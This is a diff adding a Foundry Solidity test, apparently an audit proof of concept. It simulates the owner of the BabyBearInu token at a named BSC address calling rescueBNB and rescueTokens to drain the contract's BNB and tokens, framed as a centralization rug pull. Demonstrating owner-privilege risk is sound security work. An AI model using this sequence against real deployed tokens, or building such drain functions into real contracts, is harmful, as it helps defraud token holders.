@@ -1,0 +1,82 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for BabyBearInu (BBI)
+interface IBabyBearInu {
+    function owner() external view returns (address);
+    function rescueBNB() external;
+    function rescueTokens(address tokenAddress) external;
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function decimals() external view returns (uint8);
+    function swapEnabled() external view returns (bool);
+    function tradingEnabled() external view returns (bool);
+    function pair() external view returns (address);
+    function router() external view returns (address);
+    function exemptFee(address) external view returns (bool);
+    function allowedTransfer(address) external view returns (bool);
+    // Owner only functions
+    function updateAllowedTransfer(address account, bool state) external;
+    function updateExemptFee(address _address, bool state) external;
+    function bulkAllowedTransfer(address[] memory accounts, bool state) external;
+    function bulkExemptFee(address[] memory accounts, bool state) external;
+    function enableTrading() external;
+    function renounceOwnership() external;
+    function transferOwnership(address newOwner) external;
+    function setBuyTaxes(uint256 _marketing, uint256 _liquidity) external;
+    function setSellTaxes(uint256 _marketing, uint256 _liquidity) external;
+    function setSwapThreshold(uint256 n) external;
+    function updateMarketingWallet(address n) external;
+    function updateSwapState(bool state) external;
+    function multiSendTokens(address[] calldata addresses, uint256[] calldata amounts) external;
+    function swapThreshold() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    // Deployed contract address on BSC
+    address constant BABY_BEAR_INU = 0xB9EC8561527FF7b612c0b38Cf50e1d2225489c5d;
+
+    IBabyBearInu babyBearInu;
+
+    function setUp() public {
+        babyBearInu = IBabyBearInu(BABY_BEAR_INU);
+    }
+
+    function testCentralizationRugPull() public {
+        // Get the owner of the token
+        address owner = babyBearInu.owner();
+        vm.label(owner, "Owner");
+
+        // Ensure there is some BNB in the contract (simulate liquidity or fees)
+        deal(BABY_BEAR_INU, 1 ether);
+        // Ensure the contract holds some of its own tokens (e.g., from collected fees)
+        // Mint tokens directly to the contract using cheatcode
+        deal(BABY_BEAR_INU, BABY_BEAR_INU, 100_000 * 1e18);
+
+        uint256 initialOwnerBnb = owner.balance;
+        uint256 initialOwnerBBI = babyBearInu.balanceOf(owner);
+        uint256 contractBnbBefore = address(babyBearInu).balance;
+        uint256 contractBbiBefore = babyBearInu.balanceOf(BABY_BEAR_INU);
+
+        // Owner performs rug pull:
+        vm.startPrank(owner);
+        babyBearInu.rescueBNB();
+        babyBearInu.rescueTokens(BABY_BEAR_INU);
+        vm.stopPrank();
+
+        // Assert that the contract lost all BNB and BBI
+        assertEq(address(babyBearInu).balance, 0, "Contract should have 0 BNB after rug pull");
+        assertEq(babyBearInu.balanceOf(BABY_BEAR_INU), 0, "Contract should have 0 BBI after rug pull");
+
+        // Assert that the owner gained the funds
+        assertEq(owner.balance, initialOwnerBnb + contractBnbBefore, "Owner should have received all BNB from contract");
+        assertEq(babyBearInu.balanceOf(owner), initialOwnerBBI + contractBbiBefore, "Owner should have received all BBI from contract");
+    }
+}
+```
